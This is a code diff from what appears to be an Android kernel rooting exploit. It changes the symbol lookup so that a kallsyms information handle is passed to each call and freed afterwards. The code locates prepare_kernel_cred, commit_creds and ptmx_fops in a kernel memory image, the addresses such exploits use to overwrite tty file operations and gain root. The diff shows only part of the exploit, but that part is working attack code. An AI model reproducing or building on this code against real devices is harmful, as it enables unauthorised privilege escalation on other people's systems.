@@ -15,6 +15,7 @@
 #include "mm.h"
 #include "ptmx.h"
 #include "exploit.h"
+#include "libkallsyms/kallsyms_in_memory.h"
 
 void
 obtain_root_privilege(void)
@@ -61,21 +62,21 @@ device_detected(void)
 }
 
 static bool
-find_ptmx_fops_address(void *mem, size_t length)
+find_ptmx_fops_address(kallsyms *info, void *mem, size_t length)
 {
   find_ptmx_fops_hint_t hint;
 
-  hint.ptmx_open_address = kallsyms_in_memory_lookup_name("ptmx_open");
+  hint.ptmx_open_address = kallsyms_in_memory_lookup_name(info, "ptmx_open");
   if (!hint.ptmx_open_address) {
     return false;
   }
 
-  hint.tty_release_address = kallsyms_in_memory_lookup_name("tty_release");
+  hint.tty_release_address = kallsyms_in_memory_lookup_name(info, "tty_release");
   if (!hint.tty_release_address) {
     return false;
   }
 
-  hint.tty_fasync_address = kallsyms_in_memory_lookup_name("tty_fasync");
+  hint.tty_fasync_address = kallsyms_in_memory_lookup_name(info, "tty_fasync");
   if (!hint.tty_fasync_address) {
     return false;
   }
@@ -85,26 +86,31 @@ find_ptmx_fops_address(void *mem, size_t length)
 
 bool find_variables_in_memory(void *mem, size_t length)
 {
+  kallsyms *info;
+
   printf("Search address in memroy...\n");
 
-  if (kallsyms_in_memory_init(mem, length)) {
+  info = kallsyms_in_memory_init(mem, length);
+  if (info) {
     printf("Using kallsyms_in_memroy...\n");
 
     if (!prepare_kernel_cred) {
-      prepare_kernel_cred = (prepare_kernel_cred_t)kallsyms_in_memory_lookup_name("prepare_kernel_cred");
+      prepare_kernel_cred = (prepare_kernel_cred_t)kallsyms_in_memory_lookup_name(info, "prepare_kernel_cred");
     }
 
     if (!commit_creds) {
-      commit_creds = (commit_creds_t)kallsyms_in_memory_lookup_name("commit_creds");
+      commit_creds = (commit_creds_t)kallsyms_in_memory_lookup_name(info, "commit_creds");
     }
 
     if (!ptmx_fops) {
-      ptmx_fops = (void *)kallsyms_in_memory_lookup_name("ptmx_fops");
+      ptmx_fops = (void *)kallsyms_in_memory_lookup_name(info, "ptmx_fops");
 
       if (!ptmx_fops) {
-        find_ptmx_fops_address(mem, length);
+        find_ptmx_fops_address(info, mem, length);
       }
     }
+
+    kallsyms_in_memory_free(info);
 
     if (prepare_kernel_cred && commit_creds && ptmx_fops) {
       return true;
